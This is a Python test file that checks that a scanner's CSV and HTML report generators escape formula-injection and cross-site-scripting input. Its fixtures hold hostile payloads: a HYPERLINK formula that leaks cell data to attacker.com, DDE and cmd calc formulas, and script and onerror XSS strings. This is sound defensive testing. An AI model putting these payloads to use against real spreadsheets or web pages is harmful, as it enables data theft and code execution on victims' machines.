"""Security audit tests for report injection vectors (CSV CWE-1236 and HTML CWE-79)."""

import pytest

from reconforge.reporting.generators import (
    CSVReportGenerator,
    HTMLReportGenerator,
    sanitize_csv_cell,
)
from reconforge.reporting.models import (
    AssessmentReport,
    AssetSummary,
    FindingSummary,
    ReportMetadata,
)
from reconforge.scoring.models import AssessmentRiskPosture


class TestCSVFormulaInjectionSanitization:
    """Validate sanitization against spreadsheet formula injection (CWE-1236)."""

    @pytest.mark.parametrize(
        ("raw_input", "expected_prefix"),
        [
            ("=1+1", "'=1+1"),
            ("=cmd|' /C calc'!A0", "'=cmd|' /C calc'!A0"),
            ("+1+2", "'+1+2"),
            ("-5*2", "'-5*2"),
            ("@SUM(A1:A10)", "'@SUM(A1:A10)"),
            ("\t=cmd", "'\t=cmd"),
            ("\r=cmd", "'\r=cmd"),
        ],
    )
    def test_sanitize_csv_cell_dangerous_prefixes(
        self, raw_input: str, expected_prefix: str
    ) -> None:
        """Dangerous formula prefix characters must be prepended with a single quote."""
        sanitized = sanitize_csv_cell(raw_input)
        assert sanitized == expected_prefix

    def test_sanitize_csv_cell_benign_values(self) -> None:
        """Benign strings and non-string values must remain unaltered."""
        assert sanitize_csv_cell("Normal Finding Title") == "Normal Finding Title"
        assert sanitize_csv_cell("Apache 2.4.49") == "Apache 2.4.49"
        assert sanitize_csv_cell("") == ""
        assert sanitize_csv_cell(443) == "443"
        assert sanitize_csv_cell(None) == ""

    def test_csv_generator_injection_mitigation(self) -> None:
        """Full CSV export must neutralize malicious payload in all columns."""
        metadata = ReportMetadata(
            title='=HYPERLINK("http://attacker.com/leak?data="&A1)',
            organization="Safe Org",
            assessment_id="asm-sec-test",
            scanner_version="0.6.0",
            generated_at="2026-10-30T12:00:00Z",
        )
        posture = AssessmentRiskPosture(
            assessment_id="asm-sec-test",
            overall_score=50.0,
            risk_level="MEDIUM",
            assessed_assets_count=1,
            assets_at_risk_count=1,
        )
        findings = [
            FindingSummary(
                id='=DDE("cmd";"/C calc";"__DDE__")',
                rule_id="@INJECT_RULE",
                cve_id="+CVE-EXPLOIT",
                title="=cmd|' /C calc'!A0",
                severity="critical",
                priority="P1",
                state="confirmed",
                target_ip="192.168.1.1",
                port=80,
                description="-sensitive_description",
                remediation_guidance='@ALERT("remediation")',
                evidence={},
            )
        ]
        report = AssessmentReport(
            metadata=metadata,
            risk_posture=posture,
            assets=[],
            findings=findings,
        )

        generator = CSVReportGenerator()
        csv_text = generator.generate(report)

        # Every formula cell must be neutralized with a leading single quote
        assert "'=cmd|' /C calc'!A0" in csv_text
        assert "'@INJECT_RULE" in csv_text
        assert "'+CVE-EXPLOIT" in csv_text
        assert "'-sensitive_description" in csv_text
        assert "'@ALERT(" in csv_text


class TestHTMLXSSSanitization:
    """Validate strict HTML escaping against cross-site scripting (CWE-79)."""

    def test_html_generator_strict_escaping(self) -> None:
        """All user and scanner inputs must be strictly escaped in HTML output."""
        xss_script = "<script>alert('XSS')</script>"
        xss_img = "<img src=x onerror=\"alert('hacked')\">"
        xss_attr = '"><script>alert(1)</script>'

        metadata = ReportMetadata(
            title=f"Assessment with {xss_script}",
            organization=f"Org with {xss_img}",
            assessment_id="asm-xss-test",
            scanner_version="0.6.0",
            generated_at="2026-10-30T12:00:00Z",
        )
        posture = AssessmentRiskPosture(
            assessment_id="asm-xss-test",
            overall_score=80.0,
            risk_level="CRITICAL",
            assessed_assets_count=1,
            assets_at_risk_count=1,
            priority_distribution={"P1": 1},
        )
        findings = [
            FindingSummary(
                id="fnd-xss",
                rule_id="RULE-XSS-TEST",
                cve_id="CVE-2026-0000",
                title=f"Vulnerable Title {xss_script}",
                severity="critical",
                priority="P1",
                state="confirmed",
                target_ip="10.0.0.1",
                port=80,
                description=f"Description with {xss_script}",
                remediation_guidance=f"Remediation with {xss_img}",
                evidence={"data": xss_attr},
            )
        ]
        assets = [
            AssetSummary(
                id="ast-xss",
                ip_address="10.0.0.1",
                criticality="critical",
                risk_score=80.0,
                risk_level="CRITICAL",
                services_count=1,
                open_ports=[80],
                findings_count=1,
            )
        ]
        report = AssessmentReport(
            metadata=metadata,
            risk_posture=posture,
            assets=assets,
            findings=findings,
        )

        generator = HTMLReportGenerator()
        html = generator.generate(report)

        # Raw unescaped dangerous tags must NOT be present
        assert "<script>alert" not in html
        assert "<img src=x onerror" not in html

        # Escaped representations must be present
        assert "&lt;script&gt;alert" in html
        assert "&lt;img src=x onerror=" in html
